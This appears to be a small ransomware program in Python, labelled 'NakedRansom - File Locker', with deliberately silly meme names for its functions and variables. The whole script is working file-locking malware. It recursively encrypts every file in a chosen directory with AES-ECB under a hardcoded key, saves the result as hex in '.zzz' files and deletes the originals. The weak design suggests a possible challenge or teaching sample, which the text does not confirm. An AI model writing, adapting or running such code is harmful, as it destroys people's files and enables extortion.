#!/usr/bin/env python3

import os
import binascii
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import argparse

def skibidi(ohio, cringe):
    rizz = AES.new(cringe, AES.MODE_ECB)
    unlimitedaura = pad(ohio, AES.block_size)
    return rizz.encrypt(unlimitedaura)

def fanumtax(grindset, cringe):
    with open(grindset, 'rb') as johnpork:
        ohio = johnpork.read()
    sigma = skibidi(ohio, cringe)
    gyatt = binascii.hexlify(sigma).decode('utf-8')
    kaicenat = grindset + '.zzz'
    with open(kaicenat, 'w') as johnpork:
        johnpork.write(gyatt)
    os.remove(grindset)
    print(f"[!] {kaicenat} has been locked.")

def mewing(footfetish, cringe):
    for brainrot, _, djkhaled in os.walk(footfetish):
        for johnpork in djkhaled:
            grindset = os.path.join(brainrot, johnpork)
            fanumtax(grindset, cringe)

def main():
    gigachad = argparse.ArgumentParser(description='NakedRansom - File Locker')
    gigachad.add_argument('-enc-dir', required=True, help='Path to the directory containing files to lock.')
    bingchilling = gigachad.parse_args()
    cringe = b'721819471283918281940192'
    mewing(bingchilling.enc_dir, cringe)

if __name__ == "__main__":
    main()
